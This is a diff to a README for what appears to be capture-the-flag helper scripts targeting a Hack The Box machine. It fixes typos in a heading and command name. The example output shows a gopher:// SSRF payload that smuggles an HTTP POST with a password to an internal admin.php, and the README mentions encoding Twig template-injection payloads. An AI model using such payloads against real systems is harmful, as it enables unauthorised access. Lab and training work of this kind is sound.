@@ -7,13 +7,13 @@ The `SSTI-payload-encode.py` is for correctly encode the `Twig` payload to make 
 
 Usage:
 
-### 1. Gopeher-manual.py
+### 1. Gopher-manual.py
 
 You may need to manually swap the request and the host (u1) inside the `gopher-manual.py`
 
 ```shell
 ┌──(kali㉿kali)-[~]
-└─$ python3 gopherus-manual.py
+└─$ python3 gopher-manual.py
 gopher://thatserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20thatserver.htb%0D%0AContent-Length:%2017%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Apassword%3Dadmin123
 gopher%3A//thatserver.htb%3A80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3A%2520thatserver.htb%250D%250AContent-Length%3A%252017%250D%250AContent-Type%3A%2520application/x-www-form-urlencoded%250D%250A%250D%250Apassword%253Dadmin123
 ```
